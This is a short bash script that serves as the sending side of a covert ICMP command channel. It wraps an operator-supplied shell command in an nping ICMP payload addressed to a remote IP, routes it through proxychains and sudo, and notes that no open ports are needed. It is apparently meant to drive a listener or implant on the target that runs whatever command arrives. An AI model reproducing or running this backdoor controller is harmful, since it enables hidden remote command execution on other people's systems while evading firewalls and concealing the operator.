#!/usr/bin/env bash

. /home/${USER}/Documents/scripts/linux/lib-cecho.sh

if [ $# -ne 2 ]; then
	cecho warning "Usage: $(basename $0) <ip_address> \"<command>\""
	exit 1
fi


REMOTE_IP="$1"
COMMAND="$2"


cecho debug "Command is: ${COMMAND}"
cecho task "Sending command"

# Newer method using a custom ICMP payload, no open ports necessary
# Send 'COMMAND<command>COMMAND' to target to execute command
proxychains -q sudo nping --icmp -c 1 --data-string "COMMAND${COMMAND}COMMAND" ${REMOTE_IP} 2>/dev/null 1>&2

cecho done "Command sent"
